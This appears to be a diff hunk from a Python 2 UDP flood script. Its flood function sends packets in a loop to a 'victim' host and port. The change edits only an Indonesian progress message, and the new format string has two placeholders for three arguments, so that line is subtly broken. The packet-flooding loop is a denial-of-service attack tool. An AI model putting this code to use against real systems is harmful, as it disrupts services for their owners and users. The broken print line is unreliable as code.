@@ -21,7 +21,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "Paket Sedang Diantar Oleh Kurir "%(sent, victim, vport)
+        print "Paket Sedang Diantar Ke %s , %s Oleh Kurir "%(sent, victim, vport)
 
 def main():
     print len(sys.argv)
